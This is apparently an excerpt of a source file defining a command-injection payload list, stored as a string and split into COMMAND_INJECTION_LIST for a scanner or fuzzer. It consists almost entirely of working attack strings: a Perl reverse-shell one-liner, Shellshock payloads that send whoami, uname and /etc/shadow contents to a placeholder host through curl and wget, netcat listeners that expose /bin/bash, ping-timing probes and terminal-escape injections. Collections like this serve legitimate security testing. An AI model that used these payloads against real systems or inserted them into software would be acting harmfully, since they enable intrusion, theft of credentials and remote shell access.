...
%0a
%0a id %0a
%0a ping -i 30 IP_PLACEHOLDER %0a
%0a%0d
...
%2 -n 21 IP_PLACEHOLDER||`ping -c 21 IP_PLACEHOLDER` #' |ping -n 21 IP_PLACEHOLDER||`ping -c 21 IP_PLACEHOLDER` #\" |ping -n 21 IP_PLACEHOLDER
...
& echo "use Socket;$i="IP_PLACEHOLDER";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
& id
& ifconfig
& ipconfig /all
& ls -l /
...
& phpinfo()
& ping -i 30 IP_PLACEHOLDER &
& ping -n 30 IP_PLACEHOLDER &
& pwd
...
() { :;}; /bin/bash -c "curl http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
() { :;}; /bin/bash -c "curl http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
() { :;}; /bin/bash -c "curl http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
() { :;}; /bin/bash -c "curl http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
() { :;}; /bin/bash -c "curl http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
() { :;}; /bin/bash -c "curl http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
() { :;}; /bin/bash -c "curl http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=5"
() { :;}; /bin/bash -c "sleep 1 && curl http://IP_PLACEHOLDER/.testing/shellshock.txt?sleep=1&?vuln=6"
() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
() { :;}; /bin/bash -c "sleep 3 && curl http://IP_PLACEHOLDER/.testing/shellshock.txt?sleep=3&?vuln=7"
() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
() { :;}; /bin/bash -c "sleep 6 && curl http://IP_PLACEHOLDER/.testing/shellshock.txt?sleep=6&?vuln=8"
() { :;}; /bin/bash -c "sleep 6 && curl http://IP_PLACEHOLDER/.testing/shellshock.txt?sleep=9&?vuln=9"
() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
() { :;}; /bin/bash -c "wget http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
() { :;}; /bin/bash -c "wget http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
() { :;}; /bin/bash -c "wget http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
() { :;}; /bin/bash -c "wget http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
() { :;}; /bin/bash -c "wget http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
() { :;}; /bin/bash -c "wget http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
() { :;}; /bin/bash -c "wget http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=4"
() { :;}; curl http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=12
() { :;}; echo vulnerable 10
() { :;}; wget http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=11
() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=13;curl http://IP_PLACEHOLDER/.testing/shellshock.txt?vuln=15;\");'
...
\n/usr/bin/id\n
\n/usr/bin/id|
\n\033[2curl http://IP_PLACEHOLDER/.testing/term_escape.txt?vuln=1?user=\`whoami\`
\n\033[2wget http://IP_PLACEHOLDER/.testing/term_escape.txt?vuln=2?user=\`whoami\`
...
COMMAND_INJECTION_LIST = _command_injection_string.splitlines()